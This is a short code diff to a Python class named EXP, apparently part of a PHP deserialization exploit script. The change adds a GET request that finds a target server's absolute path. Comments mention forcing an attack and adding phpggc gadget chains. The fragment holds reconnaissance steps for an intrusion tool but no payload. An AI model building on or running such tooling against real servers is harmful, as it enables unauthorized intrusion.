@@ -116,6 +116,10 @@ class EXP:
         else:
             print("未找到匹配的内容！")
 
+    def get_attempt(self):
+        res = requests.get(self.__url, verify=False, timeout=5)
+        return res.text
+
 
     def __init__(self, target):
         self.target = target
@@ -126,7 +130,10 @@ class EXP:
         #    print("[*] You can also call obj.exp() to force an attack.")
         #else:
         #    self.exp()
-        self.find_path(self.__unserialize_log())
+        # POST请求获取绝对路径
+        # self.find_path(self.__unserialize_log())
+        # GET请求获取绝对路径
+        self.find_path(self.get_attempt())
         print(self.path)
         #这里还可以增加phpggc的使用链
         self.__gadget_chains = {
